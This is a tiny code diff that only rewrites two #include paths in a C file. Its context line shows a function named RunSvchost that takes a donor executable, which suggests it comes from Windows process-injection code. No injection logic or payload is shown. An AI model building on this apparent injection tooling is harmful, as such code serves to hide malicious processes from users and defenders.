@@ -1,5 +1,5 @@
-#include "core\injects.h"
-#include "core\debug.h"
+#include "..\..\include\core\injects.h"
+#include "..\..\include\core\debug.h"
 
 DWORD RunSvchost( HANDLE* hprocess, HANDLE* hthread, const char* exeDonor, const char* nameUser )
 {
